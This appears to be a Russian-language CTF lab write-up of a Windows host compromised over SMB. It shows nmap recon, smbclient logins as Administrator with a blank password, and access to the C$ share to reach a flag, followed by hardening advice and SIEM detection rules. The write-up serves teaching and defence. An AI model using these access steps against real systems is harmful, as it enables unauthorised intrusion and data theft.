## 1. Recon

### Сетевое сканирование (Nmap)

Первичное сканирование портов и служб целевого хоста:

```bash
sudo nmap -sC -sV -p- 10.129.X.X
```

Ключевой вывод Nmap:

```text
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds? Windows Server 2019 / Windows 10
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
```

### Логика разведки

- Порты `135`, `139`, `445/tcp`: открыт стандартный стек служб Windows — MSRPC, NetBIOS и SMB over TCP.
- Сетевые веб-сервисы и SSH отсутствуют, что указывает на основной вектор атаки через сетевой стек SMB.
- Параметр `Message signing enabled but not required` свидетельствует об отсутствии обязательной цифровой подписи пакетов SMB, что упрощает прямые сетевые взаимодействия.

## 2. Vulnerability / Misconfig Analysis

Компрометация хоста обусловлена следующими критическими недостатками конфигурации:

### Пустой пароль встроенной учетной записи Administrator (Blank Password)

- **Root Cause:** Для встроенного аккаунта `Administrator` не был задан пароль (или разрешена аутентификация с пустой строкой), а также отсутствовали локальные политики ограничения использования пустых паролей через сеть.
- **Влияние:** Возможность прохождения сетевой аутентификации от имени локального администратора без необходимости подбора или кражи хешей.

### Неограниченный удаленный доступ к административным ресурсам (Administrative Shares)

- **Root Cause:** Ресурсы по умолчанию (`C$`, `ADMIN$`) открыты для удаленного подключения по протоколу SMB для привилегированных пользователей без сегментации на сетевом уровне.
- **Влияние:** Мгновенный полный доступ на чтение и запись ко всей файловой системе Windows — корню системного диска `C:`.

## 3. Exploitation

### Шаг 1: Энумерация сетевых ресурсов (SMB Shares)

Проверка доступности сетевых шаров с учетными данными администратора и пустым паролем с помощью `smbclient`:

```bash
smbclient -L //10.129.X.X -U Administrator
```

Результат выполнения при запросе пароля — нажат `Enter`:

```text
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
```

Подтвержден доступ к скрытым административным дискам.

### Шаг 2: Интерактивный доступ к файловой системе хоста

Подключение напрямую к скрытому системному ресурсу `C$`:

```bash
smbclient \\\\10.129.X.X\\C$ -U Administrator
```

### Шаг 3: Навигация и извлечение данных

Переход в профиль локального администратора и выгрузка флага:

```text
smb: \> cd Users\Administrator\Desktop\

  desktop.ini                       AHS      282  Wed Apr 21 11:23:32 2021
```

## 4. Remediation & SOC Detection

### Практические меры защиты (Remediation)

#### Парольная политика (Password Policy)

- Принудительно задать сложный уникальный пароль для встроенной учетной записи `Administrator` или отключить ее (`Disable Account`), используя для администрирования персонализированные аккаунты с LAPS (Local Administrator Password Solution).
- Включить политику: `Accounts: Limit local account use of blank passwords to console logon only` — ограничение использования пустых паролей только консольным входом.

#### Сетевая сегментация

Заблокировать входящий трафик по портам SMB (`445/tcp`, `139/tcp`) на периметре и между сегментами с помощью Windows Defender Firewall, оставив доступ только доверенным Jump-хостам / PAM.

#### SMB Hardening

Включить обязательную цифровую подпись сообщений: `SMB Signing: Require`.

### SOC & Detection Perspective

| Источник логов / Уровень | Сигнатура / Поведение | Рекомендуемое правило SIEM/EDR |
|---|---|---|
| Windows Security Log (Event ID `4624`) | Успешный вход в систему (`Logon Type 3` — Network) под учетной записью `Administrator` без использования NTLM/Kerberos хеша пароля. | Алерт: сетевой вход привилегированного локального администратора с удаленного хоста. |
| Windows Security Log (Event ID `4672`) | Назначение специальных привилегий при входе через сеть (`SeSecurityPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`). | Корреляция с Event ID `4624` для обнаружения активности Remote Admin. |
| Windows Security Log (Event ID `5140` / `5145`) | Доступ к административным сетевым ресурсам `\\*\C$` или `\\*\ADMIN$`. | Алерт: подключение к административным скрытым ресурсам не с серверов администрирования/резервного копирования. |

## 5. Lessons Learned

- **Дефолтные конфигурации опасны:** наличие стандартных аккаунтов без надежного пароля нивелирует все встроенные механизмы разграничения прав операционной системы.
- **Административные ресурсы — критический вектор:** доступ к ресурсу `C$` эквивалентен прямому контролю над файловой системой и позволяет не только читать чувствительные файлы, но и реализовывать техники закрепления (Persistence) и удаленного исполнения кода — например, через запись в Startup или запуск сервисов.
